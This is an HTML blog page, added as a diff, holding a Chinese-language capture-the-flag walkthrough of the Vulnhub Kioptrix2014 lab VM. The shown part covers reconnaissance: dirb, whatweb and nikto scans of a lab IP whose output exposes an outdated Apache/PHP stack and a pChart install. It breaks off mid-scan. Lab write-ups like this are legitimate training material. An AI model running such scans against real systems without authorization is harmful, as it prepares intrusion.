@@ -1,0 +1,1326 @@
+<!DOCTYPE html>
+
+
+
+  
+
+
+<html class="theme-next pisces use-motion" lang="zh-Hans">
+<head>
+  <meta charset="UTF-8"/>
+<meta http-equiv="X-UA-Compatible" content="IE=edge" />
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1"/>
+<meta name="theme-color" content="#222">
+
+
+
+
+
+
+
+
+
+<meta http-equiv="Cache-Control" content="no-transform" />
+<meta http-equiv="Cache-Control" content="no-siteapp" />
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+  
+  
+  <link href="/lib/fancybox/source/jquery.fancybox.css?v=2.1.5" rel="stylesheet" type="text/css" />
+
+
+
+
+
+
+
+<link href="/lib/font-awesome/css/font-awesome.min.css?v=4.6.2" rel="stylesheet" type="text/css" />
+
+<link href="/css/main.css?v=5.1.4" rel="stylesheet" type="text/css" />
+
+
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="32x32" href="/images/favicon-32x32-next.png?v=5.1.4">
+
+
+  <link rel="icon" type="image/png" sizes="16x16" href="/images/favicon-16x16-next.png?v=5.1.4">
+
+
+  <link rel="mask-icon" href="/images/logo.svg?v=5.1.4" color="#222">
+
+
+
+
+
+  <meta name="keywords" content="Vulnhub," />
+
+
+
+
+  
+
+
+  <link rel="alternate" href="/atom.xml" title="P3aceSh4wn's blog" type="application/atom+xml" />
+
+
+
+
+
+
+<meta name="description" content="Talk is cheap, show me writeup  用到的工具和知识 nmap、dirb、nikto、google、searchsploit、LFI、BurpSuite、netcat  靶机下载">
+<meta property="og:type" content="article">
+<meta property="og:title" content="Vulnhub Kioptrix2014 Writeup">
+<meta property="og:url" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/index.html">
+<meta property="og:site_name" content="P3aceSh4wn&#39;s blog">
+<meta property="og:description" content="Talk is cheap, show me writeup  用到的工具和知识 nmap、dirb、nikto、google、searchsploit、LFI、BurpSuite、netcat  靶机下载">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/1.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/2.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/3.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/4.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/5.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/6.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/7.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/8.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/9.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/10.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/11.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/12.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/13.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/14.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/15.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/16.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/17.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/18.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/19.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/20.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/22.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/21.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/23.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/24.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/25.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/26.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/27.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/29.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/30.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/31.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/35.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/32.png">
+<meta property="og:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/33.png">
+<meta property="article:published_time" content="2020-03-10T05:36:56.000Z">
+<meta property="article:modified_time" content="2020-03-12T12:25:47.177Z">
+<meta property="article:author" content="Shawn">
+<meta property="article:tag" content="Vulnhub">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/1.png">
+
+
+
+<script type="text/javascript" id="hexo.configurations">
+  var NexT = window.NexT || {};
+  var CONFIG = {
+    root: '/',
+    scheme: 'Pisces',
+    version: '5.1.4',
+    sidebar: {"position":"left","display":"post","offset":12,"b2t":false,"scrollpercent":false,"onmobile":false},
+    fancybox: true,
+    tabs: true,
+    motion: {"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},
+    duoshuo: {
+      userId: '0',
+      author: '博主'
+    },
+    algolia: {
+      applicationID: '',
+      apiKey: '',
+      indexName: '',
+      hits: {"per_page":10},
+      labels: {"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}
+    }
+  };
+</script>
+
+
+
+  <link rel="canonical" href="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/"/>
+
+
+
+
+
+  <title>Vulnhub Kioptrix2014 Writeup | P3aceSh4wn's blog</title>
+  
+
+
+
+
+
+
+
+
+<meta name="generator" content="Hexo 4.2.0"></head>
+
+<body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
+ 
+ 
+ <link rel="stylesheet" href="/dist/APlayer.min.css">
+<div id="aplayer"></div>
+<script type="text/javascript" src="/dist/APlayer.min.js"></script>
+<script type="text/javascript" src="/dist/music.js"></script>
+ 
+  
+  
+    
+  
+
+  <div class="container sidebar-position-left page-post-detail">
+    <div class="headband"></div>
+
+    <header id="header" class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-wrapper">
+  <div class="site-meta ">
+    
+
+    <div class="custom-logo-site-title">
+      <a href="/"  class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">P3aceSh4wn's blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+      
+        <p class="site-subtitle"></p>
+      
+  </div>
+
+  <div class="site-nav-toggle">
+    <button>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+      <span class="btn-bar"></span>
+    </button>
+  </div>
+</div>
+
+<nav class="site-nav">
+  
+
+  
+    <ul id="menu" class="menu">
+      
+        
+        <li class="menu-item menu-item-home">
+          <a href="/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-home"></i> <br />
+            
+            首页
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-tags">
+          <a href="/tags/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-tags"></i> <br />
+            
+            标签
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-categories">
+          <a href="/categories/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-th"></i> <br />
+            
+            分类
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-archives">
+          <a href="/archives" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-question-circle"></i> <br />
+            
+            归档
+          </a>
+        </li>
+      
+        
+        <li class="menu-item menu-item-about">
+          <a href="/about/" rel="section">
+            
+              <i class="menu-item-icon fa fa-fw fa-user"></i> <br />
+            
+            关于
+          </a>
+        </li>
+      
+
+      
+        <li class="menu-item menu-item-search">
+          
+            <a href="javascript:;" class="popup-trigger">
+          
+            
+              <i class="menu-item-icon fa fa-search fa-fw"></i> <br />
+            
+            搜索
+          </a>
+        </li>
+      
+    </ul>
+  
+
+  
+    <div class="site-search">
+      
+  <div class="popup search-popup local-search-popup">
+  <div class="local-search-header clearfix">
+    <span class="search-icon">
+      <i class="fa fa-search"></i>
+    </span>
+    <span class="popup-btn-close">
+      <i class="fa fa-times-circle"></i>
+    </span>
+    <div class="local-search-input-wrapper">
+      <input autocomplete="off"
+             placeholder="搜索..." spellcheck="false"
+             type="text" id="local-search-input">
+    </div>
+  </div>
+  <div id="local-search-result"></div>
+</div>
+
+
+
+    </div>
+  
+</nav>
+
+
+
+ </div>
+    </header>
+
+    <main id="main" class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          <div id="content" class="content">
+            
+
+  <div id="posts" class="posts-expand">
+    
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal" itemscope itemtype="http://schema.org/Article">
+  
+  
+  
+  <div class="post-block">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/03/10/Vulnhub-Kioptrix2014-Writeup/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="Shawn">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="P3aceSh4wn's blog">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">Vulnhub Kioptrix2014 Writeup</h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2020-03-10T13:36:56+08:00">
+                2020-03-10
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/%E6%89%93%E9%9D%B6/" itemprop="url" rel="index">
+                    <span itemprop="name">打靶</span>
+                  </a>
+                </span>
+
+                
+                
+                  ， 
+                
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/pentest-training/" itemprop="url" rel="index">
+                    <span itemprop="name">pentest training</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+          
+
+          
+          
+
+          
+            <span class="post-meta-divider">|</span>
+            <span class="page-pv"><i class="fa fa-file-o">></i>
+            <span class="busuanzi-value" id="busuanzi_value_page_pv" ></span>
+            </span>
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        <p><strong>Talk is cheap, show me writeup</strong></p>
+<blockquote>
+<p><strong>用到的工具和知识</strong></p>
+<p>nmap、dirb、nikto、google、searchsploit、LFI、BurpSuite、netcat</p>
+</blockquote>
+<p><a href="https://download.vulnhub.com/kioptrix/kiop2014.tar.bz2" target="_blank" rel="noopener">靶机下载</a></p>
+<a id="more"></a>
+
+<h2 id="0x00-前置问题解决"><a href="#0x00-前置问题解决" class="headerlink" title="0x00 前置问题解决"></a>0x00 前置问题解决</h2><ul>
+<li>靶机启动之后，nmap扫不到靶机ip，即使重启更换NAT模式也无效？<ul>
+<li>将虚拟机配置中网络适配器移除，再次安装，设定为NAT或者桥接即可</li>
+<li><a href="https://medium.com/@yashanand155/kioptrix-2014-networking-8440017ea795" target="_blank" rel="noopener">blog</a></li>
+</ul>
+</li>
+</ul>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/1.png" alt></p>
+<h2 id="0x01-信息搜集"><a href="#0x01-信息搜集" class="headerlink" title="0x01 信息搜集"></a>0x01 信息搜集</h2><p>nmap查找基本信息</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/2.png" alt></p>
+<p>80和8080端口开启</p>
+<p>访问80端口</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/3.png" alt></p>
+<p>8080端口</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/4.png" alt></p>
+<p>8080端口暂时没有权限访问</p>
+<p>用工具继续收集信息</p>
+<p>我们用目录遍历工具dirb、nikto、whatweb</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> dirb commen.txt扫描结果：</span></span><br><span class="line">80</span><br><span class="line">+ http://192.168.206.141:80/cgi-bin/ (CODE:403|SIZE:210)</span><br><span class="line">+ http://192.168.206.141:80/index.html (CODE:200|SIZE:152)</span><br><span class="line"></span><br><span class="line">8080</span><br><span class="line">+ http://192.168.206.141:8080/cgi-bin/ (CODE:403|SIZE:210)</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> whatweb扫描结果：</span></span><br><span class="line">80 </span><br><span class="line"><span class="meta">#</span><span class="bash"> http://192.168.206.141:80 </span></span><br><span class="line">[200 OK] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.206.141], Meta-Refresh-Redirect[pChart2.1.3/index.php], OpenSSL[0.9.8q], PHP[5.3.8], WebDAV[2]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> http://192.168.206.141/pChart2.1.3/index.php </span></span><br><span class="line">[302 Found] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.206.141], OpenSSL[0.9.8q], PHP[5.3.8], RedirectLocation[examples/index.php], WebDAV[2], X-Powered-By[PHP/5.3.8]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> http://192.168.206.141/pChart2.1.3/examples/index.php </span></span><br><span class="line">[200 OK] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.206.141], OpenSSL[0.9.8q], PHP[5.3.8], Script, Title[pChart 2.x - examples rendering], WebDAV[2], X-Powered-By[PHP/5.3.8]</span><br><span class="line"></span><br><span class="line">8080</span><br><span class="line"><span class="meta">#</span><span class="bash"> http://192.168.206.141:8080 </span></span><br><span class="line">[403 Forbidden] Apache[2.2.21][mod_ssl/2.2.21], Country[RESERVED][ZZ], HTTPServer[FreeBSD][Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8], IP[192.168.206.141], OpenSSL[0.9.8q], PHP[5.3.8], Title[403 Forbidden], WebDAV[2]</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> nikto扫描结果：</span></span><br><span class="line">- Nikto v2.1.6</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.206.141</span><br><span class="line">+ Target Hostname:    192.168.206.141</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-03-10 14:34:38 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8</span><br><span class="line">+ Server leaks inodes via ETags, header found with file /, inode: 67014, size: 152, mtime: Sun Mar 30 01:22:52 2014</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ PHP/5.3.8 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.</span><br><span class="line">+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.</span><br><span class="line">+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</span><br><span class="line">+ 8345 requests: 0 error(s) and 11 item(s) reported on remote host</span><br><span class="line">+ End Time:   2020-03-10 14:35:54 (GMT8) (76 seconds)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ 1 host(s) tested</span><br></pre></td></tr></table></figure>
+
+<p>发现whatweb扫描80端口出来一个<code>http://192.168.206.141/pChart2.1.3/index.php</code>，访问一下试试</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/5.png" alt></p>
+<p>发现是个图表生成页面（PHP做的），这应该就是靶机入口了，进一步侦查，可以点击相应按钮阅读代码，发现都是先将PHP包含进来</p>
+<p>访问<code>http://192.168.206.141/pChart2.1.3/class/</code>，出现如下页面</p>
+<p><img src="/2020/03/10/Vulnhub-Kioptrix2014-Writeup/6.png" alt></p>
+<p>既然已经出现了一个路径，可以想到能访问的不止这一个路径，于是在其基础上继续用dirb、nikto扫描</p>
+<figure class="highlight shell"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">$</span><span class="bash"> dirb http://192.168.206.141/pChart2.1.3/</span></span><br><span class="line"><span class="meta">#</span><span class="bash"> dirb扫描结果：</span></span><br><span class="line">START_TIME: Tue Mar 10 14:59:28 2020</span><br><span class="line">URL_BASE: http://192.168.206.141/pChart2.1.3/</span><br><span class="line">WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line"></span><br><span class="line">GENERATED WORDS: 4612</span><br><span class="line"></span><br><span class="line">---- Scanning URL: http://192.168.206.141/pChart2.1.3/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/cache/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/class/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/data/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/fonts/</span><br><span class="line">+ http://192.168.206.141/pChart2.1.3/index.php (CODE:302|SIZE:0)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/cache/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/class/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/data/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/ ----</span><br><span class="line">+ http://192.168.206.141/pChart2.1.3/examples/index.php (CODE:200|SIZE:86764)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/pictures/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/resources/</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/sandbox/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/fonts/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/pictures/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/resources/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/sandbox/ ----</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/sandbox/includes/</span><br><span class="line">+ http://192.168.206.141/pChart2.1.3/examples/sandbox/index.php (CODE:200|SIZE:45314)</span><br><span class="line">==&gt; DIRECTORY: http://192.168.206.141/pChart2.1.3/examples/sandbox/script/</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/sandbox/includes/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">---- Entering directory: http://192.168.206.141/pChart2.1.3/examples/sandbox/script/ ----</span><br><span class="line">(!) WARNING: Directory IS LISTABLE. No need to scan it.</span><br><span class="line">    (Use mode '-w' if you want to scan it anyway)</span><br><span class="line"></span><br><span class="line">-----------------</span><br><span class="line">END_TIME: Tue Mar 10 15:01:35 2020</span><br><span class="line">DOWNLOADED: 13836 - FOUND: 3</span><br><span class="line"></span><br><span class="line"><span class="meta">#</span><span class="bash"> nikto扫描结果：</span></span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Target IP:          192.168.206.141</span><br><span class="line">+ Target Hostname:    192.168.206.141</span><br><span class="line">+ Target Port:        80</span><br><span class="line">+ Start Time:         2020-03-10 14:59:15 (GMT8)</span><br><span class="line">---------------------------------------------------------------------------</span><br><span class="line">+ Server: Apache/2.2.21 (FreeBSD) mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8</span><br><span class="line">+ Retrieved x-powered-by header: PHP/5.3.8</span><br><span class="line">+ The anti-clickjacking X-Frame-Options header is not present.</span><br><span class="line">+ The X-XSS-Protection header is not defined. This header can hint to the user agent to protect against some forms of XSS</span><br><span class="line">+ The X-Content-Type-Options header is not set. This could allow the user agent to render the content of the site in a different fashion to the MIME type</span><br><span class="line">+ Root page / redirects to: examples/index.php</span><br><span class="line">+ No CGI Directories found (use '-C all' to force check all possible dirs)</span><br><span class="line">+ OpenSSL/0.9.8q appears to be outdated (current is at least 1.0.1j). OpenSSL 1.0.0o and 0.9.8zc are also current.</span><br><span class="line">+ Apache/2.2.21 appears to be outdated (current is at least Apache/2.4.12). Apache 2.0.65 (final release) and 2.2.29 are also current.</span><br><span class="line">+ mod_ssl/2.2.21 appears to be outdated (current is at least 2.8.31) (may depend on server version)</span><br><span class="line">+ PHP/5.3.8 appears to be outdated (current is at least 5.6.9). PHP 5.5.25 and 5.4.41 are also current.</span><br><span class="line">+ Allowed HTTP Methods: GET, HEAD, POST, OPTIONS, TRACE</span><br><span class="line">+ OSVDB-877: HTTP TRACE method is active, suggesting the host is vulnerable to XST</span><br><span class="line">+ mod_ssl/2.2.21 OpenSSL/0.9.8q DAV/2 PHP/5.3.8 - mod_ssl 2.8.7 and lower are vulnerable to a remote buffer overflow which may allow a remote shell. http://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082, OSVDB-756.</span><br><span class="line">+ OSVDB-12184: /pChart2.1.3/?=PHPB8B5F2A0-3C92-11d3-A3A9-4C7B08C10000: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /pChart2.1.3/?=PHPE9568F36-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /pChart2.1.3/?=PHPE9568F34-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-12184: /pChart2.1.3/?=PHPE9568F35-D428-11d2-A769-00AA001ACF42: PHP reveals potentially sensitive information via certain HTTP requests that contain specific QUERY strings.</span><br><span class="line">+ OSVDB-3268: /pChart2.1.3/data/: Directory indexing 